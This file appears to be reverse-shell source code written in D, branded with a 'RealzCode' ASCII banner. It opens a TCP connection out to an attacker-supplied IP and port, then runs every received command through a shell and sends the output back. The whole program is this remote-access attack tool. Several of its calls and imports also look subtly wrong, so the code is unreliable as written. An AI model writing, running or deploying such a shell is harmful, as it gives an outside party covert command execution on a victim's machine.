#!/usr/bin/rdmd
import std.stdio;
import std.socket;
import std.algorithm;
import std.conv;

void main(string[] args)
{
    string we = `  _____            _      _____          _      
 |  __ \          | |    / ____|        | |     
 | |__) |___  __ _| |___| |     ___   __| | ___ 
 |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \
 | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
 |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
`;

    if (args.length < 3)
    {
        writefln("Please provide the IP address and Port as command-line arguments.");
        return;
    }

    string ip = args[1];
    ushort port;
    if (!to!ushort(args[2], port))
    {
        writefln("Invalid port number.");
        return;
    }

    auto clientIp = getHostByName(getHostname());
    we ~= "Client IP: " ~ clientIp ~ "\n";

    try
    {
        auto socket = new TcpSocket;
        socket.connect(new InternetAddress(ip, port));

        socket.send(we);
        while (true)
        {
            socket.send("$ ");
            string cmd = socket.receive!string();
            cmd = cmd.strip();

            if (!cmd.length)
                continue;

            string output = "";
            if (cmd == "exit")
            {
                socket.close();
                break;
            }
            else
            {
                auto process = pipeShell(cmd, Redirect.stdout);
                output = process.stdout.byChunk(4096).joiner;
            }

            socket.send(output);
        }
    }
    catch (Exception ex)
    {
        writefln("Error: %s", ex.msg);
    }
}
